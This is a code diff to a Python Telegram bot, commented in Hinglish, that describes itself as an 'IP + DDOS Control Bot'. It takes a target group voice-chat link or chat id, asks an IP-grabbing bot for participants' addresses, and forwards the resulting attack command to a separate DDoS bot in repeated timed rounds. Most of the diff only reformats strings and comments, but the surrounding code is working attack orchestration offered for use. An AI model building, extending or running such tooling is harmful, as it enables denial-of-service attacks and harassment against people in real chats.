@@ -1,3 +1,4 @@
+
 import asyncio
 import re
 from telethon import TelegramClient, events
@@ -41,7 +42,9 @@ ip_waiters: dict[int, asyncio.Future] = {}  # chat_id -> Future
 bot_b_status = "UNKNOWN"
 
 
-# ==== LISTENERS ====
+# ==== TELETHON LISTENERS ====
+
+
 @tele.on(events.NewMessage(from_users=BOT_A))
 async def ip_bot_listener(event):
     """
@@ -90,6 +93,7 @@ async def bot_b_listener(event):
     elif "🔥 **ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ**" in text or "attack running" in low:
         bot_b_status = "RUNNING"
     else:
+        # other msgs ignore
         pass
 
 
@@ -100,40 +104,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     /start -> saare commands ka menu.
     """
-    text = (
-        "👋 IP + DDOS Control Bot ready.
+    text = f'''👋 IP + DDOS Control Bot ready.
 
-"
-        "Commands:
-"
-        "• /setlinkchatid <link_or_chatid>
-"
-        "   Target group VC link ya chat id set karo.
+Commands:
+/setlinkchatid <link_or_chatid>  - Target group VC link ya chat id set karo.
+/setcount <number>              - Kitni baar attack run karna hai.
+/startloop                      - Loop start: IP BOT se IP leke DDOS BOT par attack.
+/stoploop                       - Current loop turant stop karo.
 
-"
-        "• /setcount <number>
-"
-        "   Kitni baar attack run karna hai.
-
-"
-        "• /startloop
-"
-        "   Loop start: IP BOT se IP leke DDOS BOT par attack.
-
-"
-        "• /stoploop
-"
-        "   Current loop turant stop karo.
-
-"
-        "Example:
-"
-        "/setlinkchatid -1003089005092
-"
-        "/setcount 5
-"
-        "/startloop"
-    )
+Example:
+/setlinkchatid -1003089005092
+/setcount 5
+/startloop'''
     await update.message.reply_text(text)
 
 
@@ -182,6 +164,8 @@ async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ==== CORE LOOP PER CHAT ====
+
+
 async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
     """
     Har chat ke liye:
@@ -203,9 +187,9 @@ async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
 
     await context.bot.send_message(
         chat_id,
-        f'''🔁 Loop configured.
+        f"""🔁 Loop configured.
 Target: `{target}`
-Rounds: {count}''',
+Rounds: {count}""",
         parse_mode="Markdown",
     )
 
@@ -213,8 +197,8 @@ Rounds: {count}''',
         # -------- 1) IP BOT se CMD --------
         await context.bot.send_message(
             chat_id,
-            f'''➡️ Round {i + 1}/{count}:
-Sending `.getip all {target}` to IP BOT…''',
+            f"""➡️ Round {i + 1}/{count}:
+Sending `.getip all {target}` to IP BOT…""",
             parse_mode="Markdown",
         )
 
@@ -236,8 +220,8 @@ Sending `.getip all {target}` to IP BOT…''',
 
         await context.bot.send_message(
             chat_id,
-            f'''📥 IP BOT CMD received:
-`{final_cmd}`''',
+            f"""📥 IP BOT CMD received:
+`{final_cmd}`""",
             parse_mode="Markdown",
         )
 
@@ -266,9 +250,9 @@ Sending `.getip all {target}` to IP BOT…''',
         await tele.send_message(BOT_B, final_cmd)
         await context.bot.send_message(
             chat_id,
-            f'''🚀 Sent to BOT_B:
+            f"""🚀 Sent to BOT_B:
 `{final_cmd}`
-⏱️ Waiting ~40s (attack + cooldown) before next round…''',
+⏱️ Waiting ~40s (attack + cooldown) before next round…""",
             parse_mode="Markdown",
         )
 
@@ -279,12 +263,14 @@ Sending `.getip all {target}` to IP BOT…''',
 
 
 # ==== MAIN ENTRY ====
+
+
 async def main():
     await tele.start()
     print("🧵 Telethon connected")
 
     app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))           # show all commands
+    app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("setlinkchatid", setlink))
     app.add_handler(CommandHandler("setcount", setcount))
     app.add_handler(CommandHandler("startloop", startloop))
